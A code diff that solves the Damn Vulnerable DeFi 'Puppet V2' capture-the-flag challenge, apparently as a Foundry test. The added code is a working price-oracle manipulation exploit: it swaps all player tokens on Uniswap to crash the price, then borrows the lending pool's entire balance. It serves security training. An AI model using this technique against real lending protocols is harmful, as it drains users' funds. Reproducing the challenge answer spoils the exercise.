@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -98,7 +99,21 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        (uint256 reserveToken, uint256 reserveWETH) = UniswapV2Library.getReserves(address(uniswapV2Factory), address(token), address(weth));
+        uint256 WETHReceived = UniswapV2Library.getAmountOut(PLAYER_INITIAL_TOKEN_BALANCE, reserveToken, reserveWETH);
+        console.log("Weth i will receive:", WETHReceived);
         
+        // approve router to spend DVT and swap DVT for WETH
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, WETHReceived, path, player, block.timestamp + 900);
+        
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE); 
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
